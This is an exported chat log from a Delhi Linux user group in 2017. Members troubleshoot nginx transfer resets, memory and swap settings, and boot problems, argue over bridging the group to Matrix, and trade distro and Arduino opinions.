cocoa,,cocoa1231,"I have no idea what you're talking about, but just to say the obvious, have you tried to produce the error and check the system log?",1492687899

cocoa,,cocoa1231,journalctl -xe,1492687922
cocoa,,cocoa1231,To check the logs,1492687927
Tavish,,Tavishh,"@cocoa1231 yes, there is no ""error"" as such",1492688069
Tavish,,Tavishh,"""connection reset by peer"" is just something that usually happens",1492688097
cocoa,,cocoa1231,"Okay, well you'll have to ask a better person than me. That was just my wild guess",1492688119

T K,Sourabh,tk_sourabh,did you specify your static contents path in nginx?,1492688989
Tavish,,Tavishh,"yeah, it''s serving the correct file and everything (and as I said, I tried SimpleHTTPServer)",1492689073

Harsh,Spookdilya,MSFJarvis,I like this slump in confidence,1492689249
Tavish,,Tavishh,networking issue most likely,1492689251
Harsh,Spookdilya,MSFJarvis,,1492689284
Tavish,,Tavishh,"here is a tcpdump output from server, http://paste.ubuntu.com/24419824/ 

http://paste.ubuntu.com/24419896/ is on my machine, no RST packets here",1492690915
Guneet,,guneetnarula,@Tavishh yes it is a networking issue,1492693286
Guneet,,guneetnarula,Any pattern on which files?,1492693416
Guneet,,guneetnarula,"And is the error ""connection reset by peer"" or ""could not write to transfer socket""",1492693516
Guneet,,guneetnarula,I remember being stuck with this on an Ubuntu precise server a couple of years ago,1492693544
Tavish,,Tavishh,"@guneetnarula currently mostly(or only, not 100% sure) file 'compiler.umd.js' which is about 700kb",1492693546
Tavish,,Tavishh,nginx says 'client prematurely closed connection (104: Connection reset by peer) while sending response to client',1492693646
Guneet,,guneetnarula,"And a curl or wget from a different network also doesn't work, is that correct?",1492693809
Tavish,,Tavishh,"I tried curl from another server in US, it worked",1492694130
Tavish,,Tavishh,"on my machine it stops midway, and the client's TCP connection doesn't close, so it keeps waiting and times out",1492694189
Guneet,,guneetnarula,Confusing. It could just be some firewall between your local network and linode. But also if this was clearly a networking issue with linode then this problem being limited to one or two files is highly unlikely,1492694351
Guneet,,guneetnarula,How about deploying this on a different server and then trying the same request from your computer,1492694483
Tavish,,Tavishh,"yeah, gonna try on some different service altogether",1492695672

cocoa,,cocoa1231,"I'd just like to interject for a moment. What you're referring to as Linux, is in fact, GNU/Linux, or as I've recently taken to calling it, GNU plus Linux. Linux is not an operating system unto itself, but rather another free component of a fully functioning GNU system made useful by the GNU corelibs, shell utilities and vital system components comprising a full OS as defined by POSIX. Many computer users run a modified version of the GNU system every day, without realizing it. Through a peculiar turn of events, the version of GNU which is widely used today is often called 'Linux', and many of its users are not aware that it is basically the GNU system, developed by the GNU Project. There really is a Linux, and these people are using it, but it is just a part of the system they use. Linux is the kernel: the program in the system that allocates the machine's resources to the other programs that you run. The kernel is an essential part of an operating system, but useless by itself; it can only function in the context of a complete operating system. Linux is normally used in combination with the GNU operating system: the whole system is basically GNU with Linux added, or GNU/Linux. All the so-called 'Linux' distributions are really distributions of GNU/Linux.",1494435229

cocoa,,cocoa1231,"I checked my memory usage with gnome-system-monitor, and it's showing that I'm using 786 MiB of memory. I used the ps_mem.py script, and it's showing 490.4 MiB. Any idea why?",1495050404
Quanon,,Quanon,ps_mem.py does not account for cache maybe?,1495050583
cocoa,,cocoa1231,Hmm. Lemme check with htop,1495050597
cocoa,,cocoa1231,"Now, gnome-system-monitor shows I'm using 1.1 GiB, ps_mem.py shows I'm using  910.9 MiB, while htop shows 803 MiB",1495050669
Quanon,,Quanon,doesn't htop show more details,1495050700
cocoa,,cocoa1231,Yeah,1495050725

cocoa,,cocoa1231,Output of?,1495050792
Quanon,,Quanon,top,1495050798
cocoa,,cocoa1231,It doesn't give a text output. I'm not sure how to get that output,1495050824
Quanon,,Quanon,I think linux used to have a free or memfree command?,1495050875
Quanon,,Quanon,"lemme check, booting a vm",1495050884
cocoa,,cocoa1231,yeah,1495050886

cocoa,,cocoa1231,Here's the output of free -h,1495050901
cocoa,,cocoa1231,matches closely with htop,1495050915
cocoa,,cocoa1231,That's not helpful... Just a sec,1495050935
cocoa,,cocoa1231,https://pastebin.com/qrP8awuR,1495050951
Quanon,,Quanon,"seems accurate, maybe gnome-monitor combines both used+cached",1495051277
cocoa,,cocoa1231,Ah,1495051294
cocoa,,cocoa1231,Anyone has any ideas how I can reduce chromium's memory usage?,1495051319
Quanon,,Quanon,"yes, use opera",1495051345
cocoa,,cocoa1231,"I did, but I couldn't get flash or netflix working",1495051357
cocoa,,cocoa1231,I really liked opera,1495051360
Quanon,,Quanon,it has the same engine as chromium,1495051360
Quanon,,Quanon,"oh, then how about keep both ?",1495051374
cocoa,,cocoa1231,Chromium takes 400 MiB just to be running with a new tab,1495051388
Quanon,,Quanon,flash is supposed to be insecure anyhow,1495051390
Quanon,,Quanon,it is extremely insecure,1495051401
cocoa,,cocoa1231,I want flash to watch videos on mywatchseries.to,1495051403
Quanon,,Quanon,,1495051423
cocoa,,cocoa1231,hehe,1495051428
cocoa,,cocoa1231,Any idea?,1495051439
cocoa,,cocoa1231,"If you can get netflix working, then I can still switch to opera",1495051450
Quanon,,Quanon,"yes, use opera for everything, and chromium for netflix and flash",1495051466
cocoa,,cocoa1231,^,1495051483
cocoa,,cocoa1231,Virtually pointless,1495051487
cocoa,,cocoa1231,I only have 4 GiB,1495051493
Quanon,,Quanon,"ok, use firefox for netflix and flash",1495051504
Quanon,,Quanon,though I think even firefox stopped flash...,1495051515
cocoa,,cocoa1231,Firefox is using more memory than chromium,1495051516
Quanon,,Quanon,,1495051526
cocoa,,cocoa1231,Yeah..,1495051530
cocoa,,cocoa1231,On all 3 distros,1495051534
cocoa,,cocoa1231,Installed on this machine,1495051538
Quanon,,Quanon,do yo have no script and adblock installed ?,1495051539
cocoa,,cocoa1231,I have stock Firefox,1495051555
Quanon,,Quanon,essential stuff,1495051555
Quanon,,Quanon,that explains it,1495051562
cocoa,,cocoa1231,?,1495051567
Quanon,,Quanon,"no script + adblock = me not even caring how many tabs are open, can easily open 50+",1495051596
cocoa,,cocoa1231,Lemme try,1495051605
Quanon,,Quanon,plus I didn't even know youtube had ads for the longest time,1495051610
Quanon,,Quanon,cause of noscript,1495051614
cocoa,,cocoa1231,Wouldn't that take money from content creators,1495051626
Quanon,,Quanon,I didn't know...so I didn't care,1495051649
Quanon,,Quanon,no I enable it for certain sites,1495051659
cocoa,,cocoa1231,Okay,1495051659
Quanon,,Quanon,got to know when some one tweeted they hated ads,1495051674
Quanon,,Quanon,"I was like... ""Youtube has ads Oo""",1495051686
cocoa,,cocoa1231,haha!,1495051691
Quanon,,Quanon,"anyways, no script is fun",1495051715
Quanon,,Quanon,you get to see facebook tracks everything,1495051725
Quanon,,Quanon,pick any random site ... all have facebook scripts running,1495051742
cocoa,,cocoa1231,Dang. Lemme see,1495051751
Quanon,,Quanon,"well, majority anyways",1495051766
Quanon,,Quanon,"correction, majority of the ones I visit... :p",1495051783
cocoa,,cocoa1231,Like?,1495051806
Quanon,,Quanon,"btw, best solution is... GET MORE RAM",1495051814
Quanon,,Quanon,8 GB is minimum,1495051835
Quanon,,Quanon,I would say 16 GB for serious devs ... android dev doc says 32...,1495051856
cocoa,,cocoa1231,Getting in a month or so,1495051874
Quanon,,Quanon,add vms and emulators and everything quickly get's out of hand,1495051881
cocoa,,cocoa1231,Yeah,1495051901
Quanon,,Quanon,try your my**series one,1495051965
cocoa,,cocoa1231,Can't find any Facebook script,1495052040
cocoa,,cocoa1231,on mywatchseries.to,1495052046
Quanon,,Quanon,not on the main site,1495052068
Quanon,,Quanon,"so, when you click on a show...",1495052083
cocoa,,cocoa1231,Still can't see any facebook scripts,1495052112
cocoa,,cocoa1231,I did find some on qz.com,1495052120
Quanon,,Quanon,not every where but almost everywhere,1495052185
cocoa,,cocoa1231,Yeah,1495052192
cocoa,,cocoa1231,My vm.swappiness is set to 100,1495052304
cocoa,,cocoa1231,But it's not swapping,1495052309
cocoa,,cocoa1231,"like, at all",1495052312
cocoa,,cocoa1231,swap used: 188K,1495052321
Quanon,,Quanon,cause your physical ram is not full yet,1495052330
cocoa,,cocoa1231,Oh shit.. I should have set it to 0,1495052356
cocoa,,cocoa1231,or closer to that..,1495052364
cocoa,,cocoa1231,right?,1495052366
Quanon,,Quanon,it is always preferrable to use ram over swap,1495052368
cocoa,,cocoa1231,That's how it works?,1495052371
Quanon,,Quanon,"The kernel will swap only to avoid an out of memory condition, when free memory will be below vm.min_free_kbytes limit. See the ""VM Sysctl documentation"". vm.swappiness = 1. Kernel version 3.5 and over, as well as Red Hat kernel version 2.6.32-303 and over: Minimum amount of swapping without disabling it entirely.",1495052395
Quanon,,Quanon,you should always keep it to minimum,1495052439
cocoa,,cocoa1231,I wanna see how it goes when it's swapping everything,1495052456
Quanon,,Quanon,cause your ram is orders of magnitude faster and swapping won't really help but slow the machine down,1495052472
cocoa,,cocoa1231,"I know, but still wanna take a stab at it",1495052485
Quanon,,Quanon,your machine will become unresponsive,1495052487
cocoa,,cocoa1231,Won't be the first time...,1495052498
Quanon,,Quanon,vm.swappiness = 100   The kernel will swap aggressively.,1495052562
Quanon,,Quanon,you are already at the right setting for that then,1495052572
Quanon,,Quanon,however,1495052579
cocoa,,cocoa1231,"I thought it was ""When vm.swappiness% memory is used, then start swapping""",1495052604
cocoa,,cocoa1231,"in which case, it would be, ""When 100% memory is used, then start swapping""",1495052626
Quanon,,Quanon,so swapping only happens when physical  memory is out of available cache space,1495052643
Quanon,,Quanon,only in that condition would this variable really take effect I think... would need to read up more about it to confirm,1495052674
Quanon,,Quanon,https://en.wikipedia.org/wiki/Swappiness,1495052697
cocoa,,cocoa1231,But I've used this on my old Ubuntu installations. I increased vm.swappiness up to 100 and it used to swap even if the memory wasn't completely full,1495052729
T K,Sourabh,tk_sourabh,"Use ""the great suspender"" extn to suspend tabs in chrome. @cocoa1231",1495052776
Quanon,,Quanon,maybe it(physical mem) was cleared cause of the swap,1495052788
Quanon,,Quanon,"as in mem filled, some cache moved ot swap... mem freed up?",1495052821
cocoa,,cocoa1231,Maybe. I didn't look into that at that time. Lemme fill up my RAM to see if it starts swapping,1495052849
Quanon,,Quanon,"I think what you want is different,  you want cache to be always force used from disk ?",1495052856
Quanon,,Quanon,disk/swap,1495052883
cocoa,,cocoa1231,Yes,1495052895
Quanon,,Quanon,try fork bomb :p,1495052932
cocoa,,cocoa1231,"I don't want it to completely crash, just to fill up",1495052945
cocoa,,cocoa1231,And I have..,1495052949
Quanon,,Quanon,I used to have a lot of fun with it ... most distros still don't disable crashing with this by default,1495052957
cocoa,,cocoa1231,,1495052980
cocoa,,cocoa1231,,1495052991

cocoa,,cocoa1231,How do I do that?,1495053234
cocoa,,cocoa1231,I'm sure they have safeguards,1495053247

cocoa,,cocoa1231,Alight. I'll see what I can dig up,1495053295
Shashank,Kumar,realslimshanky,Then we can do something like this to prevent such things from our friendly intruders/ intruder friends üòÇ,1495053316
Quanon,,Quanon,"it's pretty easy to safeguard against this, it's just most desktop distros do not go that extra mile to secure your system",1495053319
cocoa,,cocoa1231,Yeah,1495053341
Shashank,Kumar,realslimshanky,Do we have such protocols mentioned somewhere which we can follow to secure our systems?,1495053373

So one last question. How can I cache apps that I use? Like Firefox. To reduce startup time. I tried writing a systemd unit file. Dunno why that didn't work.",1495053878

cocoa,,cocoa1231,Another thing I've noticed with apt on my system is that it takes a really long time to actually start downloading. It's stuck on waiting for like 30 seconds before it actually starts downloading,1501845132
cocoa,,cocoa1231,"zypper, yum/dnf, and pacman all work almost instantaniously",1501845157
.,,rajudev,"well, it might be because of the differences in how packages are kept and managed on debian repositories. as well the implementation of apt",1501845231
.,,rajudev,"Also although we might bother about those 30 seconds, a usual user does not bother about such issues.",1501845269

why/how this
¬†happens ?¬† I was just trying to take a look at my system, using df.
This is what I saw :

Filesystem¬† ¬† ¬† Size¬† Used Avail Use% Mounted on
devtmpfs¬† ¬† ¬† ¬† 1.9G¬† ¬† ¬†0¬† 1.9G¬† ¬†0% /dev

/dev/sda5¬† ¬† ¬† ¬†411G¬† ¬†71M¬† 390G¬† ¬†1% /extra

¬†sda5 uses on 71 M out of 411 G but it shows 1%.¬† which itself is
arithmetically wrong. At the same time, sda4 has used 11G out of 453 G,
it shows only 3 % used. This is inconsistent with the percentage used by
sda5 (11G cannot be 3 times 71M). What is happening in my case (and why
does this happen only to me ) ? Or, is df cheating me ?

- help speaker prepare talk in a way more suited to the audience , as the volunteers are collecting the stats of the audience. Adding content along the way.
- there was feedback to help new speakers to practice before the talk. Be it 2hrs or a day or week before the meetup.
- cost for tea & snacks are borne by the volunteers. Till we implement another feedback received regarding funds, having monthly meetup costs half.

tchncs_bridge,,tchncs_bot,"rajudev: go ahead, I am listening",1503420875
Himanshu Khokhar,Jaat,rinne_parad0x,th thing is,1503420892
Himanshu Khokhar,Jaat,rinne_parad0x,there are a huge number of platforms to gather but it is not really a good option to be a gp on every single one of them,1503420926
Himanshu Khokhar,Jaat,rinne_parad0x,why?,1503420929
Himanshu Khokhar,Jaat,rinne_parad0x,"Because that would make what we are seeing now, we will have to connect each and every single thing",1503420951
Himanshu Khokhar,Jaat,rinne_parad0x,"if we are ultimately linking, why not just be on  at most 2 or 3 platforms",1503420974
Himanshu Khokhar,Jaat,rinne_parad0x,"like Telegram ( which techie does not use it), Slack (am not there and I personally don't like it), IRC (Telegram is the new IRC)",1503421004
Himanshu Khokhar,Jaat,rinne_parad0x,"in all and all, managing one thing is much easier and if they have to join that gp on their fav app/platform, why not on Telegram only (note: I am NOT saying we restrict to Telegram itself only, I am just saying)",1503421069
tchncs_bridge,,tchncs_bot,"rajudev: Exactly. Why should one join different platforms for a similar group, be it Telegram/Matrix/Slack/IRC ?",1503421113
Himanshu Khokhar,Jaat,rinne_parad0x,and I even don't know Matrix exists,1503421139
tchncs_bridge,,tchncs_bot,rajudev: but what if I can join the same group irrespective of the service I choose to join it..,1503421170
tchncs_bridge,,tchncs_bot,rajudev: now you know that Matrix exists and it is being extensively used as well,1503421192
tchncs_bridge,,tchncs_bot,rajudev: see matrix.org,1503421195

Himanshu Khokhar,Jaat,rinne_parad0x,well can't argue with that,1503421446
Himanshu Khokhar,Jaat,rinne_parad0x,"IMO if you want to be a part of something, you must follow that something's rules/restrictions/options and not your own",1503421480
Himanshu Khokhar,Jaat,rinne_parad0x,"but then again, it is my opinion, everyone is entitled to their own",1503421539

.,,rajudev,that is a norm for groups,1503421600
.,,rajudev,"Exactly. If someone is not a techie, they can easily join via telegram. If someone is techie enough, they can choose IRC/Matrix",1503421682
Banana,,nihilist_banana,What's the point of a community that supports only a limited set of people? You can put those norms on your secret society groups.,1503421722

Himanshu Khokhar,Jaat,rinne_parad0x,How exactly is Telegram not technical enough,1503421736
Himanshu Khokhar,Jaat,rinne_parad0x,the technicality is in gp and not on platform,1503421748

Sahil,,warlord77,We haven't bridged irc yet,1503623858

Did the messages in this group explode because of matrix integration? If I had joined this group as a telegram user itself, would you be having this conversation ? I dont understand, having a bot in here that is not disturbing you in any way is irritating you ?

> Matrix Bridge is such a Pro Free Software idea and why is it encouraged and pushed through our throat here on this channel ?
> 
I am not a pro free software evangelist. I'm a privacy advocate. I dont prefer to use the term free software. I only used the term open source. For hardcore free software fans, there is Free Software Community of India channel in both matrix, and irc with around 200 people. Look up the difference. Free softrware, Open source software & hardware, Linux, they all go hand in hand.
If it was me explaining about matrix that irritated all of you in here, well, then all I can tell is that I am totally disappointed in all of you. If you cannot keep an open mind or if you have too much resistance to change, you will NEVER thrive in technological career. I believe most of you are students here. My suggestion, is to try out various technologies, analyze and then decided whether its good for you or not. Biased dismissal of technology is not the best action a learned enginner would do. Id like to ask, those who are revolting against matrix here, have you took time to understand what it is? Have you visited its website? Like I said, if your intention joining this group is to learn, be inquisitive.",1503635259

That is a choice i have. What power do you have to refrain me from doing so ? For example, When I say ""RISC-V is a good alternative to ARM"" and try to explain its advantages over other architectures, you have a few options - 1) be curious and understand what I'm telling makes sense, or 2) if you're convinced that you do not agree with it, you can argue back solely on the technical merit of it. 3) Ignore the discussion and carry on with your work
But the statement you just made, makes it personal. ""Else I will leave folks to there wisdom"" Do you realize that you're sort of threatening? And do I care you leave or not? Absolutely not. Argue on the technical merits or demerits of a technology. Not on personal actions. They are pointless, and waste of time. Rather, if you are arguing on technical topics, people watching the discussion might learn a thing or two.",1503637981
Satyakam,Goswami,Satyaakam,"Dude everyone here knows me better that a  privacy freaking someone from somewhere , the things i have been talking about has got nothing to do with technology or learning again may lord Ganesha give you some wisdom  and patience to read and understand others and live peacefully ever after",1503638308

Then probbaly you dont belong here. I'd like the admins to clarify what is the primary motive of this group. Satyakam Goswami (Telegram) and friends came here first, so they should be knowing what this group was made for. So if I am overstepping, communicate it clearly",1503639101

Otherwise, they reserve the right to ban anyone who does not adhere to the group rules",1503639426

tchncs_bridge,,tchncs_bot,"rajudev: I appreciate the fact that people here are vocal and do not refrain from voicing there opinions down.

I just hope that even if you guys are arguing with each other, it stays in context and even after the discussion you people still stay together maintaining the inclusivity of the group.",1503640398
tchncs_bridge,,tchncs_bot,"rajudev: With that said, do we do not want any new member to join the group? Should we refrain any one new joining the ILUGD telegram group?",1503640466

Satyakam,Goswami,Satyaakam,"Mailing list is as good as dead , after telegram came in now there is one more new thing and tomorrow there will be something else my whole point and argument is this is and was about the existence of this group as in Why you guys exist here and why i should be here for is the questions we all need to answer",1503641525

Satyakam,Goswami,Satyaakam,I think you got it all wrong it was about the Matrix tag then your alias its too confusing we are unable to have meanigful conversation is what i think is the point,1503641745
tchncs_bridge,,tchncs_bot,"rajudev: Satyakam Goswami (Telegram): Guruji, Surely with integrations we will have people having constructive opinions and discussions here. And that is our goal at the end, right?",1503641747

Satyakam,Goswami,Satyaakam,anyway my point is in the name of technology integration or growth or people we are loosing focus of the group,1503641865

So lets explore the ideas @theskumar is pointing to. yes we can arugue endlessless again Github not being FOSS and one day they will also cease to exist i would say the probablity is low since they are making money and doing some good on there way.i recall there was project http://freedomboxfoundation.org/ don't know whats it status is now ? it can be a potential solution too .",1503892749

Debian Packaging pre requisites - Loomio
On previous packaging workshops, we had to spent a lot of time troubleshooting issues when people used older versions of Ubuntu which had older version of dh-make, gem2deb, npm2deb etc. So we thought of clearly mentioning the pre requisites so we can use the available time more efficiently.

Akash,Mishra,akash47,@Quanon Hi,1504975137
Akash,Mishra,akash47,Some members feel that the current setup of SFD is not aligned with the values the event actually intends to promote.,1504975196
Akash,Mishra,akash47,There is no mention of any dedicated activity which seeks to educate the audience about software freedom and the right to privacy.,1504975210
Akash,Mishra,akash47,Talks by other communities talking about what software freedom means for their group is good but it still doesnt tell the audience what software freedom should mean to them. It doesnt tell them why they should care about it in the first place.,1504975291
Akash,Mishra,akash47,"Since its a collaborative event, ILUGD would like to actively help out in organizing it.
In addition to the groups talking about what software freedom means to them, We would like to hold atleast 2 talks on educating the audience about software freedom and privacy.",1504975351

RandomAcess,,Random_access,@cocoa1231 and @Raghav can we pin some basic books/links/pdfs which could probably lead somebody who is new to Linux to a right path. The same could also be a yardstick to where a person's knowledge would be----something like beginners/intermediate/expert,1506407937
cocoa,,cocoa1231,"Hmm. Okay, I'll see if I can compile a list",1506407985
Raghav,,Rwbhu,"So, if the internet is a web, Linux running on routers and servers is basically a stream of pipes. To learn how these pipes work (primary functionality of the OS) focus on the fundamentals of the system",1506408312

T K,Sourabh,tk_sourabh,Please collaborate with @akash47 @warlord77,1506410555
Raghav,,Rwbhu,"Books may not be as useful as solving real world problems. I have a few of them, that need solving. The doing of these problems will address this requirement of learning real world Linux. You can please direct message me if one is interested in working on Linux / C++ / networking /embedded systems/ Raspberry Pi. Cheers",1506412396
Srihari,Unnikrishnan,arcsaber,so what do you need again?,1506412479
RandomAcess,,Random_access,While I agree to this thought...think this as a step by step learning process for anybody interested in Linux. A link/website/book suggested will simply take somebody from the foundation to the flavours of utilities Linux has.,1506428876

Hello all, reminder & updates about the implementation of issue tracker mechanism for open designs

We have a group 'Open Design' in code.swecha.org(self-hosted GitLab[https://github.com/gitlabhq/gitlabhq])

For better organization, I'm proposing to segregate design requests into 3 projects.

Project 1: Branding
Style Guides and Logos will be part of this project.

Project 2: 2D graphics
Posters/banners for events/announcement/info-graphics etc. will be part of this project.
[this project will take style info inputs from Project 1: Branding]

Project 3: 3D
3D designs for 3D printing, Vitural Reality and Augmented Reality etc will be part of this project.

Please suggest your improvisations/critique on these to re-organize or propose new projects.",1506802438

Paras,Verma,,"Dual booted Ubuntu 17.10 with Windows 10 (1709), needed to remove ubuntu, deleted the ubuntu partition, removed ubuntu from EFI partition.

Now bios is not saving any changes.
No external flash drive or bootable media is being detected.

And Ubuntu grub still prevents windows from loading.

How to resolve this issue?",1508501153
Raghav,,Rwbhu,Would like that the whole 144GB ext4 partition joins / and increases the size of my / partition.,1508502607
Raghav,,Rwbhu,But max size of the / partition is 19.9 gb and the 144 gb is not an option as an expansion of the/ when I resize the partition,1508502608
Raghav,,Rwbhu,How to do this...,1508502619
Paras,Verma,,"Because the partition ised for root (linux installation) lies after the 144gig unallocated space on the physical drive.

This is not posible without a third party utility.

OS only allows users to to expand a partition to next space.",1508503420
Paras,Verma,,"If it's an encrypted installation, try removimg the LVM encryption and try to expand again.",1508503493

Paras,Verma,,This is what bios looks like,1508503779

Kuntal,M,hellozee,"just delete that, dont format it..",1508504416
Paras,Verma,,Don't reformat it. Just delete it and try again.,1508504612
Paras,Verma,,That's the issue. There is absolutely nothing on the disk. I cleaned it. And still it has the option for ubuntu and windows.,1508504689
cocoa,,cocoa1231,That's probably because you didn't remove the EFI entities properly. How did you remove them?,1508504727
Kuntal,M,hellozee,deleted that windows system partition?,1508504762

Don't expect us to help when you're running Kali Linux as your Main OS

‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî


If you're a newbie, you do not want to get into Kali Linux. All the tools that Kali has can be installed on pretty much all mainstream distributions.
http://docs.kali.org/introduction/should-i-use-kali-linux

If you have to ask for help you shouldnt use Kali at all:
https://unix.stackexchange.com/questions/399626/why-is-kali-linux-so-hard-to-set-up-why-wont-people-help-me

If you really want to use Kali, use it in a VM. It is not meant to be your host OS as it is terribly insecure. 

If you don't want to use Kali, and are looking for something bleeding edge, you may as well try Antergos. Or any other mainstream distribution that's not Kali.

Udit,Gupta,uditwapt,"With the increasing advent of AI, and the 'bot culture' in vogue, CYBER CUP'17 presents to you 

"" ANDROBOTS ""
An amazing platform where you get to design your own bots & contribute towards automating as many mundane tasks as possible. 

- The participants have to design their own bots at the venue and present their bots. 

For the backend of the bot you could use an API(such as api.ai) or code it using Python,node js etc & for front end you can either use a messaging platform (like Telegram, SLACK)or you can build an android app etc.  

It could be anything from a sensor bot, customer support chat bots, a fun Emojify bot, horoscope bot & what not! 

Think out ot the box, Showcase your coding skills & come out with an 'extraordinary product'.

Innovation is the key ! 

So stop thinking...& start building !

Join us on 24th Oct 2017 and let's tread on together in this techie ride of bots!

tchncs_bridge,,tchncs_bot,"Yash Bhardwaj: my Laptop's wifi card is misbehaving . It does so after a use of 2-3 hours.
i guess it has heat issues .
initially it created problems in Ubuntu 17.04 , but worked fine in kali and windows.Later it stopped working in windows too . unfortunately i do not have kali in my machine anymore .

i am guessing it is some hardware problem . What are your thoughts on this , guys ?
and if i need to buy a new card/interface what should i prefer ? currently i was using a intel card .",1508940765

tchncs_bridge,,tchncs_bot,"<b>Yash Bhardwaj:</b> Srihari Unnikrishnan (Telegram):

TL;DR;
the thing is that used used ubuntu 17.04 as my primary os , and i could connect to an access point namely AP913, if  by chance or some reason , if this connection got disrupted . then it would not connect untill i would manually forget the connection [ i.e. delete the saved credential entry [using gui] ]  , only then it used to connect again.
some time later even this trick/jugad stoped working .
but i must tell it worked better in windows and kali.
this led me to believe that it has something to do with drivers .
although i did not look for the appropriate drivers then.
not the problem is that i am finally in a windows session and the device is connected[ i just noticed , lol]
but after some time i will definitely get disconnected and once it gets disconnected fom AP913 , it will not be able to connect to AP913 , and at the same time will easily connect to AP912 [which offers a lower speed]",1508941364

Manas,kashyap,reflect0r,I will,1509257393

cocoa,,cocoa1231,"Ubuntu mate and linux mint are excellent choices firstly. Secondly, UM and LM will both stay out of your way, and let you get to work. Manjaro is pretty amazing too (and a personal favourite) but its more geared towards new users who wanna dig into Linux.

That bring said, once you understand Linux well enough, the distro doesn't matter that much. Want stability? Go for Debian. Want bleeding edge software? Arch/antergos/manjaro. Want security? Fedora or cent os  or open SUSE. You're paranoid and have shit loads of time? Gentoo, Slackware and lfs",1510046168

When i did the installation using another usb bootable. My bios saved the new boot record and lost the old boot record for my actuall ubuntu installation.

If i insert the pendrive. I can see the option to boot into my regular ubuntu destribution.
Without the pd i am directed to the grub menu",1510250377
Shashank,Kumar,realslimshanky,Keeping it persistent to change means keeping the data and os configuration intact while live booting an OS. Can be done in many ways like one which @cocoa1231 suggested.,1510250460

Yes i understand",1510250509
yash,,imyashbhardwaj,The problem is that most of the tools i found were either for windows or did not work properly when i tried,1510250564

yash,,imyashbhardwaj,"It had to do something with insmod.

Problem is i never really understood what i did there",1510251416
cocoa,,cocoa1231,"That's probably because you didn't tell the installer that you need to install grub to the USB, not the hard drive",1510254086

It searches for the bootloader in the USB device",1510254150

In case of Termux, yes, Uninstalling the app would remove all the packages installed by it. It installs them in a sandbox, and that sandbox is part of app data, which is delete when an app is removed.

I might be wrong though. Anyone wanna correct me?",1510600743

karmanya,aggarwal,calmdownkarm,I think Google developer days are 1st and 2nd,1510993620
Kuntal,M,hellozee,@rajudev  https://twitter.com/meetingembedded/status/930402711845171200,1510996697
.,,rajudev,"Regarding the points in the image. 
I only use the Arduino IDE when I need to to transfer the code to Arduino. 
To write my code I use either nano/micro/atom text editors. 
I find most other points true.",1511005406
.,,rajudev,Regarding different libraries for different components. That is a pain sometimes,1511005443
.,,rajudev,"Many times, along with writing code I have to open and read the whole source code of the libraries in order to use it efficiently along with my code.",1511005575
karmanya,aggarwal,calmdownkarm,"To be fair though, most arduino libraries are like 1 object and a small amount of functions. Things like this are almost inevitable given the plug and play nature Arduino was intended to have. I actually think if people want a gentle introduction to micros these days Mbed is significantly nicer from a dev point of view.",1511005992
.,,rajudev,I think overhead of reading libraries is fine for the modularity that the plug and play feature provided by the arduino ecosystem.,1511006643
.,,rajudev,The fact that anyone can develop a module along with its own library is more beneficial to the eco system. Although a pain sometimes for the coder.,1511006824
karmanya,aggarwal,calmdownkarm,"Right, but arduino isn't really intended for hardcore devs, it's more about the fact that it's easily accessible - to let people flash leds and play with servos immediately without necessarily understanding how electronics or code works",1511008479
karmanya,aggarwal,calmdownkarm,"at least imo, in that brief it's amazing",1511008496
karmanya,aggarwal,calmdownkarm,generalizing and unifying things would make it slightly more difficult to quickstart in my opinion,1511008519
Kuntal,M,hellozee,"@calmdownkarm, wow the username, exactly what I wanted to say",1511008579
karmanya,aggarwal,calmdownkarm,it fits the brief :),1511008607
.,,rajudev,"Well, different people different opinions and point of views. 

I have used arduino in slightly bigger Robots measuring over a meter and weighing over 25 KGs. 

Also there was considerable complexity in terms of designing and interfacing of both mechanical and electronics aspects of it. 

I understand your point of view, but I believe that arduino is equally capable of being used in  robotics even on industrial scale.",1511008799
Kuntal,M,hellozee,@rajudev so slow...,1511008886
.,,rajudev,On the move,1511008934
karmanya,aggarwal,calmdownkarm,"I mean I get that it can be used, and kudos to you for doing that - but personally I like having some of the frills that the newer micros offer if I'm doing more sophisticated things. Even just a JTAG makes life significantly easier in my opinion.",1511009036
karmanya,aggarwal,calmdownkarm,"actually noob question - So I've used ubuntu exclusively for the last few years now because as a tool it just works without much fiddling, but are there any compelling reasons to switch distros today?",1511017117
Kuntal,M,hellozee,nope,1511017141

Manas,kashyap,reflect0r,Just stick to it.,1511018040
Manas,kashyap,reflect0r,"Just u use Arch, u think u are great enough. Get lost man, get some shame.

Xeon,Zolt,Xeon_Zolt,"I'd just like to interject for moment. What you're refering to as Linux, is in fact, GNU/Linux, or as I've recently taken to calling it, GNU plus Linux. Linux is not an operating system unto itself, but rather another free component of a fully functioning GNU system made useful by the GNU corelibs, shell utilities and vital system components comprising a full OS as defined by POSIX.
Many computer users run a modified version of the GNU system every day, without realizing it. Through a peculiar turn of events, the version of GNU which is widely used today is often called Linux, and many of its users are not aware that it is basically the GNU system, developed by the GNU Project.
There really is a Linux, and these people are using it, but it is just a part of the system they use. Linux is the kernel: the program in the system that allocates the machine's resources to the other programs that you run. The kernel is an essential part of an operating system, but useless by itself; it can only function in the context of a complete operating system. Linux is normally used in combination with the GNU operating system: the whole system is basically GNU with Linux added, or GNU/Linux. All the so-called Linux distributions are really distributions of GNU/Linux!",1511635166

1) It is not possible as of now. By that I mean, theoretically it is possible but there is no app/feature built in for enabling or disabling this.
There is a feature though to disable/enable access to contacts on your phone for Android apps. But it works on global scope and not available right now for individual apps. 

2) SFOS has redefined how a user should interact with a phone. So if you come from Android/iOS land, you would find it hard to get started straight on. But there's a 5 min tutorial app built in. If anyone takes that 5 minutes tutorial, even an average Joe can use SFOS.",1511710060

tchncs_bridge,,tchncs_bot,Yash Bhardwaj: tell me something that is simple and fast to produce,1512979649
tchncs_bridge,,tchncs_bot,Yash Bhardwaj: and easier to get along will be highly prefered,1512979670
Kuntal,M,hellozee,"kivy might take some time to get along, at least it was for me..",1512979789
tchncs_bridge,,tchncs_bot,Yash Bhardwaj: what else,1512979804
Kuntal,M,hellozee,"For my side it would be Qt, the only thing I have worked with in python..",1512979805
Kuntal,M,hellozee,for GUIs,1512979814
tchncs_bridge,,tchncs_bot,Yash Bhardwaj: okay,1512979869
Kuntal,M,hellozee,"you could design GUIs in Qt Designer and use them in python, there is an utility for converting Qt Designers XML into python files",1512979892
tchncs_bridge,,tchncs_bot,"Yash Bhardwaj: i tried qt with c++

it pissed me off",1512979895

